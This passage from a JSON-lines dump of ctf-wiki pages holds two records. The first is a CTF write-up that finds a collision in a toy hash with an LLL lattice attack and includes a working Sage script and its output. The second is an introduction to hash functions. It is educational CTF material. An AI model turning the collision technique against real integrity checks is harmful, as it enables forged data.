0xe6168647f636\n```\n\n题目希望我们给出两个消息，其哈希值相同。如果我们将该函数展开的话，那么\n\n$hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256}$\n\n假设两个消息的 hash 值相同那么\n\n$h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng  \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256}$\n\n进而\n\n$(x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256}$\n\n即我们只需要找到一个 n 维向量 $z_i=x_i-y_i$，满足上述等式即可，我们可以进一步将其化为\n\n$z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0$\n\n即找到一组向量满足上述这个式子。这可以认为是 LLL Paper 中第二个例子的简单情况（参见格问题部分）。\n\n那么我们可以快速构造矩阵，如下\n\n$$ A = \\left[ \\begin{matrix} 1   & 0 & 0     & \\cdots & 0 & Kg^{n-1}     \\\\ 0   & 1  & 0    & \\cdots & 0 & Kg^{n-2}  \\\\ 0   & 0   & 1   & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0   & 0   &0   & \\cdots & 1 & K*mod     \\\\ \\end{matrix} \\right]$$\n\n之后我们使用LLL 算法即可获得两个一样的哈希值\n\n```python\nfrom sage.all import *\n\nmod = 2**256\nh0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\ng = 2**168 + 355\n\n\ndef shitty_hash(msg):\n    h = h0\n    msg = map(ord, msg)\n    for i in msg:\n        h = (h + i) * g\n        # This line is just to screw you up :))\n        h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n    return h - 0xe6168647f636\n\n\nK = 2**200\nN = 50\nbase_str = 'a' * N\nbase = map(ord, base_str)\nm = Matrix(ZZ, N + 1, N + 2)\nfor i in xrange(N + 1):\n    ge = ZZ(pow(g, N - i, mod))\n    m[i, i] = 1\n    m[i, N + 1] = ZZ(ge * K)\nm[i, N + 1] = ZZ(K * mod)\n\nml = m.LLL()\nttt = ml.rows()[0]\nprint \"result:\", ttt\nif ttt[-1] != 0:\n    print \"Zero not reached, increase K\"\n    exit()\nelse:\n    msg = []\n    for i in xrange(N):\n        msg.append(base[i] + ttt[i])\n        if not (0 <= msg[i] <= 255):\n            print \"Need more bytes!\"\n            quit()\n    print msg\n    other = ''.join(map(chr, msg))\n\n    print shitty_hash(base_str)\n    print shitty_hash(other)\n```\n\n注意不能直接仅仅使用 pow(g, N - i, mod)，不然生成的数会在 mod 对应的域中，这真是个大坑。\n\n如下\n\n```shell\n➜  hashcoll sage exp.sage\nresult: (15, -14, 17, 14, 6, 0, 12, 21, 8, 29, 6, -4, -9, 10, -2, -12, -6, 0, -12, 13, -28, -28, -24, -3, 6, -5, -16, 15, 17, -14, 3, -2, -16, -25, 3, -21, -27, -9, 16, 5, -1, 0, -3, -4, -4, -19, 6, 8, 0, 0, 0, 0)\n[112, 83, 114, 111, 103, 97, 109, 118, 105, 126, 103, 93, 88, 107, 95, 85, 91, 97, 85, 110, 69, 69, 73, 94, 103, 92, 81, 112, 114, 83, 100, 95, 81, 72, 100, 76, 70, 88, 113, 102, 96, 97, 94, 93, 93, 78, 103, 105, 97, 97]\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n```\n\n即成功。", "timestamp": "2025-10-21T22:02:54.583084"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/hash/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/hash/introduction.md", "content": "# 哈希函数\n\n哈希函数（Hash Function）把消息或数据压缩成摘要，使得数据量变小。其一般模型如下\n\n![](./figure/hash.png)\n\n显然对于任何一个hash值，理论上存在若干个消息与之对应，即碰撞。\n\n哈希函数的基本需求如下\n\n| 需求     | 描述                                       |\n| ------ | ---------------------------------------- |\n| 输入长度可变 | hash函数可以应用于任意长度的数据                       |\n| 输出长度固定 | hash函数的输出长度固定                            |\n| 效率     | 对于任意消息 $x$，计算 $H(x)$ 很容易                 |\n| 单向性    | 对于任意哈希值h，想要找到满足$H(x)=h$ 的x在计算上不可行。       |\n| 抗弱碰撞性  | 对于任意消息x，找到满足另一消息y，满足$H(x)=H(y)$ ，在计算上不可行。 |\n| 抗强碰撞性  | 找到任意一对满足 $H(x)=H(y)$ 的消息x和y在计算上不可行。      |\n| 伪随机性   | 哈希函数的输出满足伪随机性测试标准。                       |\n\n散列值的目的如下\n\n- 确保消息的完整性，即确保收到的数据确实和发送时的一样（即没有修改、插入、删除或重放），防止中间人篡改。\n- 冗余校验\n- 单向口令文件，比如linux系统的密码\n- 入侵检测和病毒检测中的特征码检测\n\n目前的Hash函数主要有MD5，SHA1，SHA256，SHA512。目前的大多数hash函数都是迭代性的，即使用同一个hash函数，不同的参数进行多次迭代运算。\n\n| 算法类型   | 输出 Hash 值长度       |\n| ------ | ----------------- |\n| MD5    | 128 bit |\n| SHA1   | 160 bit           |\n| SHA256 | 256 bit           |\n| SHA512 | 512 bit           |\n", "timestamp": "2025-10-21T22:02:54.690551"}
